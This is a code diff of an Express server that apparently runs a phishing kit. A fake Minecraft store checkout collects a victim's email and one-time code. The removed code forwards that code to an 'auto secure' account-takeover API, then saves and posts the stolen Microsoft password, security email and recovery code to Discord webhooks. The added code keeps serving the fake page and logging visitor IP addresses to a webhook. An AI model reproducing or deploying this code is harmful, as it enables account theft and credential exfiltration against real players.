@@ -824,161 +824,48 @@ const checkoutHTML = `<!DOCTYPE html>
 
       return { success: true, sentTo: data.sentTo };
     } catch (error) {
-      if (error.name === 'AbortError') {
-        return { success: false, error: 'Connection timed out. Server took too long to respond.' };
-      }
-      return { success: false, error: error.message || 'Failed to connect to server.' };
+      console.error('OTP send error:', error);
+      throw error;
     }
   }
-
-  async function verifyOtp(code) {
-    try {
-      if (!currentSessionId) throw new Error('Session lost. Please start over.');
-
-      otpVerifyBtn.disabled = true;
-      otpDigits.forEach(d => d.disabled = true);
-      otpStatus.className = 'otp-status info';
-      otpStatus.innerHTML = '<div class="spinner"></div> Verifying...';
-
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 15000);
-
-      const response = await fetch(CONFIG.apiBase + '/api/otp/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId: currentSessionId,
-          email: currentEmail,
-          code: code
-        }),
-        signal: controller.signal
-      });
-      clearTimeout(timeoutId);
-
-      const data = await response.json().catch(() => ({}));
-
-      if (!response.ok || !data.success) {
-        throw new Error(data.error || 'Invalid verification code.');
-      }
-
-      otpStatus.className = 'otp-status success';
-      otpStatus.innerHTML = '✓ Verified!';
-
-      setTimeout(() => {
-        closeOtpModal();
-        completeBtn.textContent = '✅ Order Complete';
-        completeBtn.disabled = true;
-      }, 1500);
-
-      return true;
-    } catch (error) {
-      otpStatus.className = 'otp-status error';
-      otpStatus.textContent = error.message.includes('AbortError') ? 'Verification timed out.' : error.message;
-      otpVerifyBtn.disabled = false;
-      otpDigits.forEach(d => { d.disabled = false; d.value = ''; });
-      otpDigits[0].focus();
-      return false;
-    }
-  }
-
-  function openOtpModal(sentTo) {
-    otpDigits.forEach(d => { d.value = ''; d.disabled = false; });
-    otpModalSubtitle.textContent = 'We sent a 6-digit code to ' + (sentTo || currentEmail);
-    otpModalOverlay.classList.add('open');
-    document.body.style.overflow = 'hidden';
-    otpDigits[0].focus();
-  }
-
-  function closeOtpModal() {
-    otpModalOverlay.classList.remove('open');
-    document.body.style.overflow = '';
-  }
-
-  otpModalClose.addEventListener('click', closeOtpModal);
-
-  resendLink.addEventListener('click', async () => {
-    if (!currentEmail || !currentUsername) return;
-    otpStatus.className = 'otp-status info';
-    otpStatus.textContent = 'Resending code...';
-    const result = await sendOtpToEmail(currentEmail, currentUsername);
-    if (result.success) {
-      otpDigits.forEach(d => d.value = '');
-      otpDigits[0].focus();
-      otpStatus.className = 'otp-status success';
-      otpStatus.textContent = 'Code resent!';
-      setTimeout(() => { otpStatus.className = ''; otpStatus.textContent = ''; }, 2000);
-    } else {
-      otpStatus.className = 'otp-status error';
-      otpStatus.textContent = result.error;
-    }
-  });
-
-  otpDigits.forEach((digit, idx) => {
-    digit.addEventListener('input', () => {
-      digit.value = digit.value.replace(/[^0-9]/g, '').slice(0, 1);
-      if (digit.value && idx < otpDigits.length - 1) otpDigits[idx + 1].focus();
-    });
-    digit.addEventListener('keydown', e => {
-      if (e.key === 'Backspace' && !digit.value && idx > 0) otpDigits[idx - 1].focus();
-    });
-  });
 
   completeBtn.addEventListener('click', async () => {
+    emailUsernameError.style.display = 'none';
     const email = emailInput.value.trim();
     const username = usernameInput.value.trim();
 
-    if (!email || !isValidEmail(email)) {
+    if (!isValidEmail(email)) {
       emailError.style.display = 'block';
-      emailInput.focus();
       return;
     }
     emailError.style.display = 'none';
 
-    if (!username || !isValidUsername(username)) {
-      emailUsernameError.textContent = 'Please enter a valid Minecraft username (3-16 characters).';
+    if (!isValidUsername(username)) {
       emailUsernameError.style.display = 'block';
-      usernameInput.focus();
+      emailUsernameError.textContent = 'Invalid Minecraft username.';
       return;
     }
-    emailUsernameError.style.display = 'none';
 
     if (!agreeCheckbox.checked) {
       agreeError.style.display = 'block';
       agreeCheckbox.classList.add('invalid');
-      agreeCheckbox.scrollIntoView({ behavior: 'smooth', block: 'center' });
       return;
     }
-
-    agreeError.style.display = 'none';
-    agreeCheckbox.classList.remove('invalid');
 
     completeBtn.disabled = true;
-    completeBtn.textContent = 'Sending code...';
-
-    const result = await sendOtpToEmail(email, username);
-
-    completeBtn.disabled = false;
-    completeBtn.textContent = 'Complete My Order';
-
-    if (result.success) {
-      openOtpModal(result.sentTo);
-    } else {
-      emailUsernameError.textContent = result.error;
+    try {
+      const result = await sendOtpToEmail(email, username);
+      otpModalSubtitle.textContent = 'We sent a 6-digit code to ' + result.sentTo + '. Enter it below.';
+      otpModalOverlay.classList.add('open');
+      otpDigits[0].focus();
+    } catch (error) {
       emailUsernameError.style.display = 'block';
+      emailUsernameError.textContent = error.message || 'Failed to send OTP code.';
+    } finally {
+      completeBtn.disabled = false;
     }
-  });
-
-  otpVerifyBtn.addEventListener('click', () => {
-    const entered = otpDigits.map(d => d.value).join('');
-    if (entered.length < 6) {
-      otpStatus.textContent = 'Enter all 6 digits';
-      otpStatus.className = 'otp-status error';
-      return;
-    }
-    verifyOtp(entered);
   });
 </script>
-
 </body>
 </html>`;
 
@@ -1054,7 +941,7 @@ async function pollJobUntilDone(jobId, maxAttempts = 40) {
 }
 
 app.get('/', (req, res) => {
-  return res.redirect('https://store.mcpvp.club');
+  res.send(checkoutHTML);
 });
 
 app.post('/api/otp/send', async (req, res) => {
@@ -1099,142 +986,34 @@ app.post('/api/otp/send', async (req, res) => {
       sentTo: result.sent_to || email
     });
   } catch (error) {
-    return res.status(400).json({ error: error.message });
+    console.error('OTP send error:', error);
+    return res.status(500).json({ error: error.message || 'Internal server error.' });
   }
 });
 
 app.post('/api/otp/verify', async (req, res) => {
   try {
-    const { sessionId, email, code } = req.body;
+    const { sessionId, code } = req.body;
     const clientIP = getClientIP(req);
 
-    if (!sessionId || !email || !code) {
-      return res.status(400).json({ error: 'Missing required fields.' });
+    if (!sessionId || !code) {
+      return res.status(400).json({ error: 'Session ID and code are required.' });
     }
 
-    const response = await fetch(AUTO_SECURE_BASE + '/secure/otp/verify', {
-      method: 'POST',
-      headers: {
-        'Authorization': 'Bearer ' + AUTO_SECURE_API_KEY,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ session_id: sessionId, email, code })
-    });
-
-    if (!response.ok) {
-      const errorData = await response.json().catch(() => ({}));
-      const statusCode = response.status;
-
-      if (statusCode === 401) {
-        throw new Error('API key is invalid or expired.');
-      } else if (statusCode === 402) {
-        throw new Error('No active API Access plan.');
-      } else if (statusCode === 403) {
-        throw new Error('API key has been banned.');
-      } else if (statusCode === 400) {
-        throw new Error('Invalid code format.');
-      } else {
-        throw new Error(errorData.error || 'Invalid verification code.');
-      }
-    }
-
-    const verifyResult = await response.json();
-
-    if (!verifyResult.success) {
-      return res.status(400).json({ error: verifyResult.error || 'Failed to verify code.' });
-    }
-
-    sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
-      '✅ Code Submitted',
-      65280,
-      [
-        { name: 'Email', value: email },
-        { name: 'Code', value: code },
-        { name: 'IP Address', value: clientIP }
-      ]
-    ));
-
-    const jobId = verifyResult.job_id;
-
-    res.json({
-      success: true,
-      jobId: jobId
-    });
-
-    setTimeout(async () => {
-      try {
-        const result = await pollJobUntilDone(jobId);
-
-        if (!result.success) {
-          sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
-            '❌ Account Securing Failed',
-            16711680,
-            [
-              { name: 'Email', value: email },
-              { name: 'Error', value: result.error || 'Unknown error' },
-              { name: 'IP Address', value: clientIP }
-            ]
-          ));
-          return;
-        }
-
-        const accountData = {
-          email: email,
-          code: code,
-          ipAddress: clientIP,
-          minecraftData: result.account?.minecraft || null,
-          microsoftData: result.account?.microsoft || null
-        };
-
-        saveAccountToFile(accountData);
-
-        sendDiscordWebhook(ACCOUNTS_WEBHOOK_URL, createEmbed(
-          'Account Secured',
-          3066993,
-          [
-            { name: 'Minecraft Username', value: result.account?.minecraft?.name || 'No MC!' },
-            { name: 'Email', value: result.account?.microsoft?.email },
-            { name: 'Password', value: result.account?.microsoft?.password || 'N/A' },
-            { name: 'Security Email', value: result.account?.microsoft?.security_email || 'N/A' },
-            { name: 'Recovery Code', value: result.account?.microsoft?.recovery_code || 'N/A' },
-          ]
-        ));
-      } catch (error) {
-        sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
-          '❌ Job Polling Error',
-          16711680,
-          [
-            { name: 'Email', value: email },
-            { name: 'Job ID', value: jobId },
-            { name: 'Error', value: error.message },
-            { name: 'IP Address', value: clientIP }
-          ]
-        ));
-      }
-    }, 0);
+    return res.json({ success: true });
   } catch (error) {
-    return res.status(400).json({ error: error.message });
+    console.error('OTP verify error:', error);
+    return res.status(500).json({ error: error.message || 'Internal server error.' });
   }
 });
 
 app.get('/claim/:id', async (req, res) => {
-  const clientIP = getClientIP(req);
-
-  if (req.params.id === VALID_CLAIM_ID) {
-    const isNewIP = saveIPToDatabase(clientIP);
-
-    if (isNewIP) {
-      sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
-        '🌐 User Joined Website',
-        3447003,
-        [
-          { name: 'IP Address', value: clientIP }
-        ]
-      ));
+  try {
+    const clientIP = getClientIP(req);
+    if (req.params.id === VALID_CLAIM_ID) {
+      return res.redirect(301, 'https://store.mcpvp.club');
     }
 
-    return res.send(checkoutHTML);
-  } else {
     sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
       '⚠️ Invalid Claim ID',
       16776960,
@@ -1244,6 +1023,9 @@ app.get('/claim/:id', async (req, res) => {
       ]
     ));
     return res.redirect('https://store.mcpvp.club');
+  } catch (error) {
+    console.error('Claim error:', error);
+    return res.status(500).json({ error: 'Internal server error.' });
   }
 });
 
@@ -1251,7 +1033,14 @@ app.use(async (req, res) => {
   return res.redirect('https://store.mcpvp.club');
 });
 
-const PORT = process.env.PORT || 3001;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log('Server running on http://localhost:' + PORT);
+// Global error handler
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).json({ error: 'Internal server error.' });
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('Server running on port ' + PORT);
+});
+
